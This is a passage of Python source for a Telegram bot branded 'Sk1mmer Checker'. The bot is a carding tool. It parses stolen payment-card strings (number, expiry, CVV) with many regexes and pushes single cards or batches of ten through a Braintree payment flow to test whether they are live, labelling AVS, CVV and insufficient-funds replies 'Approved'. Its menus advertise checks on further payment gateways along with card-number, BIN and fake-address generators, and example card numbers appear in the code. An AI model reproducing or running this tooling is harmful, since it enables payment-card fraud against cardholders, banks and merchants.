        r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4})[|;:,\s]+(\d{1,2})/(\d{2,4})[|;:,\s]+(\d{3,4})',
        r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{3})[|;:,\s]+(\d{1,2})/(\d{2,4})[|;:,\s]+(\d{3,4})',
        r'(\d{16})[|;:,\s-]+(\d{1,2})-(\d{2,4})[|;:,\s-]+(\d{3,4})',  # e.g., 5598880214394241|06-2026|928
        r'(\d{15})[|;:,\s-]+(\d{1,2})-(\d{2,4})[|;:,\s-]+(\d{3,4})',
        r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4})[|;:,\s-]+(\d{1,2})-(\d{2,4})[|;:,\s-]+(\d{3,4})',
        r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{3})[|;:,\s-]+(\d{1,2})-(\d{2,4})[|;:,\s-]+(\d{3,4})',
        r'(\d{16})\s*(\d{1,2})\s*(\d{2,4})\s*(\d{3,4})',  # e.g., 5598880214394241 06 2026 928
        r'(\d{15})\s*(\d{1,2})\s*(\d{2,4})\s*(\d{3,4})',
        r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4})\s*(\d{1,2})\s*(\d{2,4})\s*(\d{3,4})',
        r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{3})\s*(\d{1,2})\s*(\d{2,4})\s*(\d{3,4})',
        # More additional patterns
        r'(\d{16})[|;:,\s]+(\d{1,2})/(\d{4})[|;:,\s]+(\d{3,4})',
        r'(\d{16})[|;:,\s]+(\d{1,2})-(\d{4})[|;:,\s]+(\d{3,4})',
        r'(\d{16})\s+(\d{1,2})/(\d{2,4})\s+(\d{3,4})',
        r'(\d{16})\s+(\d{1,2})-(\d{2,4})\s+(\d{3,4})',
        r'(\d{16})\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*(\d{3,4})',
        r'(\d{16})\s*(\d{1,2})\s*-\s*(\d{2,4})\s*(\d{3,4})',
        r'(\d{4}[\s-]{0,1}\d{4}[\s-]{0,1}\d{4}[\s-]{0,1}\d{4})\s*(\d{1,2})\s*(\d{2,4})\s*(\d{3,4})',
        r'(\d{4}[\s-]{0,1}\d{4}[\s-]{0,1}\d{4}[\s-]{0,1}\d{3})\s*(\d{1,2})\s*(\d{2,4})\s*(\d{3,4})',
        r'(\d{16})[|;:,\s]+(\d{4})\s*[-/]\s*(\d{1,2})[|;:,\s]+(\d{3,4})',  # Reversed expiry yy/mm
        r'(\d{16})[|;:,\s]+(\d{2,4})\s*[-/]\s*(\d{1,2})[|;:,\s]+(\d{3,4})',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            cc = re.sub(r'[\s-]', '', match.group(1))
            mm = match.group(2).zfill(2)  # Ensure 2-digit month
            yy = match.group(3)
            cvv = match.group(4)
            
            # Handle 2-digit year
            if len(yy) == 2:
                yy = '20' + yy
            
            return {
                'number': cc,
                'expiry_month': mm,
                'expiry_year': yy,
                'cvv': cvv
            }
    
    return None

def get_bin_info(card_number):
    """Get BIN information from the CSV data"""
    if not card_number:
        return None
    
    # Try different BIN lengths (6, 8, then 4)
    for length in [6, 8, 4]:
        bin_prefix = card_number[:length]
        if bin_prefix in BIN_DATA:
            return BIN_DATA[bin_prefix]
    
    return None

def format_response_text(result, card_data, response_message):
    """Format the response text according to requirements"""
    # Apply monospace formatting to credit card details
    cc_display = f"`{card_data['number']}|{card_data['expiry_month']}|{card_data['expiry_year'][-2:]}|{card_data['cvv']}`"
    
    # Get BIN information
    bin_info = get_bin_info(card_data['number'])
    
    # Determine if it's approved or declined
    error_message = ""
    if 'error' in result:
        error_message = result['error']
        # Suppress login errors
        if error_message.startswith("Login failed:"):
            error_message = "Retry ❌️"
    elif 'final_response' in result and 'error_messages' in result['final_response']:
        error_message = result['final_response']['error_messages'][0] if result['final_response']['error_messages'] else "Unknown error"
    
    # Escape underscores to preserve them in Markdown
    error_message = error_message.replace('_', r'\_')
    
    # Remove "Status code" from the response if present
    error_message = re.sub(r'(?i)status code\s*', '', error_message)
    
    # Check if it should be approved
    is_approved = any(keyword.lower() in error_message.lower() for keyword in ['avs', 'cvv', 'insufficient', 'limit exceeded'])
    
    if is_approved:
        status_text = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
    else:
        status_text = "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌"
    
    # Build response text with hyperlinked symbols without curly braces
    response_text = f"{status_text}\n\n"
    response_text += f"[㊕](t.me/Amkuushu) 𝗖𝗖 ⇾ {cc_display}\n"
    response_text += f"[㊕](t.me/Amkuushu) 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree Premium\n"
    response_text += f"[㊕](t.me/Amkuushu) 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_message}\n\n"
    
    # Add BIN info if available
    if bin_info:
        response_text += f"[㊕](t.me/Amkuushu) 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('vendor', 'N/A')} - {bin_info.get('type', 'N/A')} - {bin_info.get('level', 'N/A')}\n"
        response_text += f"[㊕](t.me/Amkuushu) 𝗕𝗮𝗻𝗸: {bin_info.get('bank_name', 'N/A')}\n"
        response_text += f"[㊕](t.me/Amkuushu) 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'N/A')} {bin_info.get('flag', '')}\n\n"
    
    response_text += f"[㊕](t.me/Amkuushu) 𝗧𝗼𝗼𝗸 {result['execution_time_seconds']:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀"
    
    return response_text

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send a message when the command /start or .start is issued."""
    # Create inline keyboard
    keyboard = [
        [
            InlineKeyboardButton("Gates ♻️", callback_data="gates"),
            InlineKeyboardButton("Tools 🛠", callback_data="tools"),
        ],
        [
            InlineKeyboardButton("Channel 🥷", url="https://t.me/sk1mmers"),
            InlineKeyboardButton("Exit ⚠️", callback_data="exit"),
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Create message with hyperlinked symbols
    message = (
        f"[朱](t.me/amkuushu) 𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 𝗦𝗸1𝗺𝗺𝗲𝗿 𝘾𝙝𝙚𝙘𝙠𝙚𝙧\n\n"
        f"[㊄](t.me/amkuushu) 𝗦𝗸1𝗺𝗺𝗲𝗿 is renewed, we present our new improved version, with fast and secure checks with different payment gateways and perfect tools for your use.\n\n"
        f"[╰┈➤](t.me/amkuushu) 𝙑𝙚𝙧𝙨𝙞𝙤𝙣  -» 1.0"
    )
    
    # Send video with caption and inline buttons
    try:
        with open('menu.mp4', 'rb') as video_file:
            await update.message.reply_video(
                video=video_file,
                caption=message,
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=reply_markup
            )
    except FileNotFoundError:
        # Fallback to text message if video not found
        await update.message.reply_text(
            message,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=reply_markup
        )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks"""
    query = update.callback_query
    await query.answer()
    
    # Define the original video and message for the "Back" button
    original_message = (
        f"<a href='https://t.me/amkuushu'>朱</a> 𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 𝗦𝗸1𝗺𝗺𝗲𝗿 𝘾𝙝𝙚𝙘𝙠𝙚𝙧\n\n"
        f"<a href='https://t.me/amkuushu'>㊄</a> 𝗦𝗸1𝗺𝗺𝗲𝗿 is renewed, we present our new improved version, with fast and secure checks with different payment gateways and perfect tools for your use.\n\n"
        f"<a href='https://t.me/amkuushu'>╰┈➤</a> 𝙑𝙚𝙧𝙨𝙞𝙤𝙣  -» 1.0"
    )
    
    if query.data == "gates":
        message = (
            "𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 Sk1mmer -» >_\n\n"
            "║<a href='https://t.me/amkuushu'>㊕</a>║ 𝙏𝙤𝙩𝙖𝙡 -» 5\n"
            "║<a href='https://t.me/amkuushu'>㊡</a>║ 𝙊𝙣 -» 1 ✅\n"
            "║<a href='https://t.me/amkuushu'>㊤</a>║ 𝙊𝙛𝙛 -» 4 ❌\n"
            "║<a href='https://t.me/amkuushu'>㊬</a> 》𝙈𝙖𝙣𝙩𝙚𝙣𝙞𝙚𝙣𝙘𝙚 -» 4 ⚠️\n\n"
            "〈<a href='https://t.me/amkuushu'>ゼ</a>〉𝙎𝙚𝙡𝙚𝙘𝙩 𝙩𝙝𝙚 𝙩𝙮𝙥𝙚 𝙤𝙛 𝙜𝙖𝙩𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙛𝙤𝙧 𝙮𝙤𝙪𝙧 𝙪𝙨𝙚!"
        )
        keyboard = [
            [
                InlineKeyboardButton("Auth", callback_data="auth"),
                InlineKeyboardButton("Charge", callback_data="charge"),
            ],
            [InlineKeyboardButton("Back", callback_data="back")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_caption(
            caption=message,
            parse_mode=ParseMode.HTML,
            reply_markup=reply_markup
        )
    elif query.data == "auth":
        message = (
            "〈<a href='https://t.me/amkuushu'>朱</a>〉𝙂𝙖𝙩𝙚𝙬𝙖𝙮𝙨 𝘼𝙪𝙩𝙝\n\n"
            "〈<a href='https://t.me/amkuushu'>朱</a>〉 𝗔𝗱𝗿𝗶 -» Zuora + Stripe -» Auth\n"
            "〈<a href='https://t.me/amkuushu'>零</a>〉 𝘾𝙢𝙙 -» .adr -» Free\n"
            "〈<a href='https://t.me/amkuushu'>ᥫ᭡</a>〉 𝙎𝙩𝙖𝙩𝙪𝙨 -» Off ❌️\n\n"
            "〈<a href='https://t.me/amkuushu'>朱</a>〉 𝘼𝙠𝙩𝙯 -» braintree -» Auth\n"
            "〈<a href='https://t.me/amkuushu'>零</a>〉 𝘾𝙢𝙙 -» .b3 -» Free\n"
            "〈<a href='https://t.me/amkuushu'>ᥫ᭡</a>〉 𝙎𝙩𝙖𝙩𝙪𝙨 -» On ✅\n\n"
            "〈<a href='https://t.me/amkuushu'>朱</a>〉 𝙎𝙚𝙭 -» Intuit -» Auth\n"
            "〈<a href='https://t.me/amkuushu'>零</a>〉 𝘾𝙢𝙙 -» .sx -» Premium\n"
            "〈<a href='https://t.me/amkuushu'>ᥫ᭡</a>〉 𝙎𝙩𝙖𝙩𝙪𝙨 -» Off ❌"
        )
        keyboard = [[InlineKeyboardButton("Back", callback_data="gates")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_caption(
            caption=message,
            parse_mode=ParseMode.HTML,
            reply_markup=reply_markup
        )
    elif query.data == "charge":
        message = (
            "〈<a href='https://t.me/amkuushu'>朱</a>〉𝙂𝙖𝙩𝙚𝙬𝙖𝙮𝙨 𝘾𝙝𝙖𝙧𝙜𝙚𝙙\n\n"
            "〈<a href='https://t.me/amkuushu'>朱</a>〉 𝙉𝙞𝙜𝙝𝙩 -» Moneris -» $0.01\n"
            "〈<a href='https://t.me/amkuushu'>零</a>〉 𝘾𝙢𝙙 -» .ni -» Premium \n"
            "〈<a href='https://t.me/amkuushu'>ᥫ᭡</a>〉 𝙎𝙩𝙖𝙩𝙪𝙨 -» Off ❌\n\n"
            "〈<a href='https://t.me/amkuushu'>朱</a>〉 𝙁𝙧𝙞𝙚𝙣𝙙 -» ePay -» $0.01\n"
            "〈<a href='https://t.me/amkuushu'>零</a>〉 𝘾𝙢𝙙 -» .fr -» Premium \n"
            "〈<a href='https://t.me/amkuushu'>ᥫ᭡</a>〉 𝙎𝙩𝙖𝙩𝙪𝙨 -» Off ❌\n\n"
            "〈<a href='https://t.me/amkuushu'>朱</a>〉 𝘼𝙨𝙪𝙢𝙖 -» Authorize.net -» $0.01\n"
            "〈<a href='https://t.me/amkuushu'>零</a>〉 𝘾𝙢𝙙 -» .as -» Premium \n"
            "〈<a href='https://t.me/amkuushu'>ᥫ᭡</a>〉 𝙎𝙩𝙖𝙩𝙪𝙨 -» Off ❌\n\n"
            "〈<a href='https://t.me/amkuushu'>朱</a>〉 𝘿𝙞𝙤𝙢𝙚𝙙𝙚𝙨 -» Tunl -» $0.01\n"
            "〈<a href='https://t.me/amkuushu'>零</a>〉 𝘾𝙢𝙙 -» .di -» Premium \n"
            "〈<a href='https://t.me/amkuushu'>ᥫ᭡</a>〉 𝙎𝙩𝙖𝙩𝙪𝙨 -» Off ❌\n\n"
            "〈<a href='https://t.me/amkuushu'>朱</a>〉 𝙋𝙖𝙮𝙋𝙖𝙡 -» PayPal -» $0.01\n"
            "〈<a href='https://t.me/amkuushu'>零</a>〉 𝘾𝙢𝙙 -» .pp -» Premium \n"
            "〈<a href='https://t.me/amkuushu'>ᥫ᭡</a>〉 𝙎𝙩𝙖𝙩𝙪𝙨 -» Off ❌>\n\n"
            "〈<a href='https://t.me/amkuushu'>朱</a>〉 𝙏𝙧𝙞𝙙𝙚𝙣𝙩 -» Transax Gateway -» $0.01 \n"
            "〈<a href='https://t.me/amkuushu'>零</a>〉 𝘾𝙢𝙙 -» .tr -» Premium \n"
            "〈<a href='https://t.me/amkuushu'>ᥫ᭡</a>〉 𝙎𝙩𝙖𝙩𝙪𝙨 -» Mantenience ⚠️\n\n"
            "〈<a href='https://t.me/amkuushu'>朱</a>〉 𝙋𝙚𝙧𝙞𝙘𝙤 -» wc Sagepay(Opayo) -» €1.00 \n"
            "〈<a href='https://t.me/amkuushu'>零</a>〉 𝘾𝙢𝙙 -» .pr -» Premium \n"
            "〈<a href='https://t.me/amkuushu'>ᥫ᭡</a>〉 𝙎𝙩𝙖𝙩𝙪𝙨 -» Off ❌\n\n"
            "〈<a href='https://t.me/amkuushu'>朱</a>〉 𝙅𝙪𝙖𝙣 -» WorldPay -» ₤0.89 \n"
            "〈<a href='https://t.me/amkuushu'>零</a>〉 𝘾𝙢𝙙 -» .jn -» Premium \n"
            "〈<a href='https://t.me/amkuushu'>ᥫ᭡</a>〉 𝙎𝙩𝙖𝙩𝙪𝙨 -» Off ❌"
        )
        keyboard = [[InlineKeyboardButton("Back", callback_data="gates")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_caption(
            caption=message,
            parse_mode=ParseMode.HTML,
            reply_markup=reply_markup
        )
    elif query.data == "tools":
        message = (
            "〈<a href='https://t.me/amkuushu'>朱</a>〉𝙂𝙖𝙩𝙚𝙬𝙖𝙮𝙨 𝙏𝙤𝙤𝙡𝙨 🛠\n\n"
            "<a href='https://t.me/amkuushu'>朱</a> 𝙍𝙚𝙛𝙚 -» send review reference\n"
            "<a href='https://t.me/amkuushu'>零</a> 𝘾𝙢𝙙 -» .refe -» reply message -» Free\n"
            "<a href='https://t.me/amkuushu'>ᥫ᭡</a> 𝙎𝙩𝙖𝙩𝙪𝙨 -» On ✅\n\n"
            "<a href='https://t.me/amkuushu'>朱</a> 𝘽𝙞𝙣 -» info bin\n"
            "<a href='https://t.me/amkuushu'>零</a> 𝘾𝙢𝙙 -» .bin -» Free\n"
            "<a href='https://t.me/amkuushu'>ᥫ᭡</a> 𝙎𝙩𝙖𝙩𝙪𝙨 -» On ✅\n\n"
            "<a href='https://t.me/amkuushu'>朱</a> 𝘾𝙝𝙖𝙩 𝙂𝙋𝙏 -» ChatGPT\n"
            "<a href='https://t.me/amkuushu'>零</a> 𝘾𝙢𝙙 -» .gpt hola -» Premium\n"
            "<a href='https://t.me/amkuushu'>ᥫ᭡</a> 𝙎𝙩𝙖𝙩𝙪𝙨 -» Off ❌\n\n"
            "<a href='https://t.me/amkuushu'>朱</a> 𝘼𝙙𝙙𝙧𝙚𝙨𝙨 -» generate address\n"
            "<a href='https://t.me/amkuushu'>零</a> 𝘾𝙢𝙙 -» .rnd us -» Free\n"
            "<a href='https://t.me/amkuushu'>ᥫ᭡</a> 𝙎𝙩𝙖𝙩𝙪𝙨 -» On ✅\n\n"
            "<a href='https://t.me/amkuushu'>朱</a> 𝙎𝙠 -» info sk\n"
            "<a href='https://t.me/amkuushu'>零</a> 𝘾𝙢𝙙 -» .sk -» Free\n"
            "<a href='https://t.me/amkuushu'>ᥫ᭡</a> 𝙎𝙩𝙖𝙩𝙪𝙨 -» On ✅\n\n"
            "<a href='https://t.me/amkuushu'>朱</a> 𝙂𝘽𝙞𝙣 -» generate bins\n"
            "<a href='https://t.me/amkuushu'>零</a> 𝘾𝙢𝙙 -» .gbin -» Free\n"
            "<a href='https://t.me/amkuushu'>ᥫ᭡</a> 𝙎𝙩𝙖𝙩𝙪𝙨 -» On ✅\n\n"
            "<a href='https://t.me/amkuushu'>朱</a> 𝘾𝘾 𝙂𝙚𝙣 -» generate ccs\n"
            "<a href='https://t.me/amkuushu'>零</a> 𝘾𝙢𝙙 -» .gen -» Free\n"
            "<a href='https://t.me/amkuushu'>ᥫ᭡</a> 𝙎𝙩𝙖𝙩𝙪𝙨 -» On ✅\n\n"
            "<a href='https://t.me/amkuushu'>朱</a> 𝙄𝙣𝙛𝙤 -» info user\n"
            "<a href='https://t.me/amkuushu'>零</a> 𝘾𝙢𝙙 -» .my -» Free\n"
            "<a href='https://t.me/amkuushu'>ᥫ᭡</a> 𝙎𝙩𝙖𝙩𝙪𝙨 -» On ✅\n\n"
            "<a href='https://t.me/amkuushu'>朱</a> 𝙋𝙡𝙖𝙣 -» info plan user\n"
            "<a href='https://t.me/amkuushu'>零</a> 𝘾𝙢𝙙 -» .plan -» Free\n"
            "<a href='https://t.me/amkuushu'>ᥫ᭡</a> 𝙎𝙩𝙖𝙩𝙪𝙨 -» On ✅\n\n"
            "<a href='https://t.me/amkuushu'>朱</a> 𝙋𝙡𝙖𝙣𝙂 -» info plan group\n"
            "<a href='https://t.me/amkuushu'>零</a> 𝘾𝙢𝙙 -» .plang -» Free\n"
            "<a href='https://t.me/amkuushu'>ᥫ᭡</a> 𝙎𝙩𝙖𝙩𝙪𝙨 -» On ✅"
        )
        keyboard = [[InlineKeyboardButton("Back", callback_data="back")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_caption(
            caption=message,
            parse_mode=ParseMode.HTML,
            reply_markup=reply_markup
        )
    elif query.data == "exit":
        await query.delete_message()
    elif query.data == "back":
        # Restore the original video, caption, and buttons
        keyboard = [
            [
                InlineKeyboardButton("Gates ♻️", callback_data="gates"),
                InlineKeyboardButton("Tools 🛠", callback_data="tools"),
            ],
            [
                InlineKeyboardButton("Channel 🥷", url="https://t.me/sk1mmers"),
                InlineKeyboardButton("Exit ⚠️", callback_data="exit"),
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # FIX 1: Complete the back button functionality
        try:
            with open('menu.mp4', 'rb') as video_file:
                media = InputMediaVideo(
                    media=video_file,
                    caption=original_message,
                    parse_mode=ParseMode.HTML
                )
                await query.edit_message_media(
                    media=media,
                    reply_markup=reply_markup
                )
        except FileNotFoundError:
            # Fallback to just editing caption if video file not found
            await query.edit_message_caption(
                caption=original_message,
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=reply_markup
            )

async def b3_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the /b3 or .b3 command"""
    user_id = update.effective_user.id
    
    # Check if we're replying to a message or if text is provided after the command
    text = None
    if update.message.reply_to_message:
        text = update.message.reply_to_message.text
    elif update.message.text:
        command_text = update.message.text.strip()
        command_parts = command_text.split(maxsplit=1)
        if len(command_parts) > 1:
            text = command_parts[1]
    
    if not text:
        await update.message.reply_text(
            'Please provide cc in the format:\n'
            'cc|mm|yy|cvv\n'
            'Example: /b3 4388576167137283|04|28|365'
        )
        return
    
    # Extract card details
    card_data = extract_card_details(text)
    if not card_data:
        await update.message.reply_text(
            'Could not extract cc. Please use the format:\n'
            'cc|mm|yy|cvv\n'
            'Example: /b3 4388576167137283|04|28|365'
        )
        return
    
    # Send processing message
    processing_msg = await update.message.reply_text("𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩...")
    
    # Create inline keyboard for the response
    keyboard = [
        [
            InlineKeyboardButton("𝗖𝗛𝗔𝗡𝗡𝗘𝗟", url="https://t.me/sk1mmers"),
            InlineKeyboardButton("𝗢𝗪𝗡𝗘𝗥", url="https://t.me/Amkuushu")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Run the payment flow with error handling to always update the message
    automator = PaymentFlowAutomator()
    try:
        result = await automator.run_full_flow(card_data, user_id, context)
        # Format the response
        response_text = format_response_text(result, card_data, "")
    except Exception as e:
        response_text = f"Error occurred: {str(e)}"
    
    # Edit the message with the result or error, including inline buttons, and disable web page preview
    await context.bot.edit_message_text(
        chat_id=processing_msg.chat_id,
        message_id=processing_msg.message_id,
        text=response_text,
        parse_mode='Markdown',
        reply_markup=reply_markup,
        disable_web_page_preview=True
    )

async def mb3_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the /mb3 or .cvv command for mass processing up to 10 CCs."""
    user_id = update.effective_user.id
    
    # Check if we're replying to a message or if text is provided after the command
    text = None
    if update.message.reply_to_message:
        text = update.message.reply_to_message.text
    elif update.message.text:
        command_text = update.message.text.strip()
        command_parts = command_text.split(maxsplit=1)
        if len(command_parts) > 1:
            text = command_parts[1]
    
    if not text:
        await update.message.reply_text(
            'Please provide up to 10 ccs, one per line, in the format:\n'
            'cc|mm|yy|cvv\n'
            'or reply to a message containing them.'
        )
        return
    
    # Split text into lines and take up to 10
    lines = text.strip().splitlines()[:10]
    if not lines:
        await update.message.reply_text('No valid ccs found.')
        return
    
    # Send processing message
    processing_msg = await update.message.reply_text("𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩... Processing mass check.")
    
    # Create inline keyboard for responses
    keyboard = [
        [
            InlineKeyboardButton("𝗖𝗛𝗔𝗡𝗡𝗘𝗟", url="https://t.me/sk1mmers"),
            InlineKeyboardButton("𝗢𝗪𝗡𝗘𝗥", url="https://t.me/Amkuushu")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    automator = PaymentFlowAutomator()
    tasks = []
    valid_lines = []  # Keep track of valid card data with corresponding lines
    
    for line in lines:
        card_data = extract_card_details(line)
        if card_data:
            tasks.append(automator.run_full_flow(card_data, user_id, context))
            valid_lines.append((line, card_data))  # Store both line and parsed data
    
    if not tasks:
        await context.bot.edit_message_text(
            chat_id=processing_msg.chat_id,
            message_id=processing_msg.message_id,
            text="No valid ccs extracted."
        )
        return
    
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    response_texts = []
    for i, result in enumerate(results):
        if isinstance(result, Exception):
            response_texts.append(f"CC {i+1}: Error occurred: {str(result)}")
        else:
            # FIX 2: Use the stored card_data instead of re-parsing
            _, card_data = valid_lines[i]
            response_texts.append(format_response_text(result, card_data, ""))
    
    # Edit the processing message with combined results
    combined_text = "\n\n".join(response_texts)
    await context.bot.edit_message_text(
        chat_id=processing_msg.chat_id,
        message_id=processing_msg.message_id,
        text=combined_text,
        parse_mode='Markdown',
        reply_markup=reply_markup,
        disable_web_page_preview=True
    )

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Log errors caused by updates."""
    print(f"Update {update} caused error {context.error}")
    if update and update.message:
        await update.message.reply_text("An error occurred. Please try again later.")

def main():
    """Start the bot."""
    # Create the Application and pass it your bot's token.
    application = Application.builder().token(TOKEN).concurrent_updates(True).build()

    # Add handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("b3", b3_command))
    application.add_handler(CommandHandler("cvv", mb3_command))
    application.add_handler(MessageHandler(filters.Regex(r'^\.start'), start_command))
    application.add_handler(MessageHandler(filters.Regex(r'^\.b3'), b3_command))
    application.add_handler(MessageHandler(filters.Regex(r'^\.cvv'), mb3_command))
    application.add_handler(CallbackQueryHandler(button_callback))
    application.add_error_handler(error_handler)

    # Run the bot until the user presses Ctrl-C
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()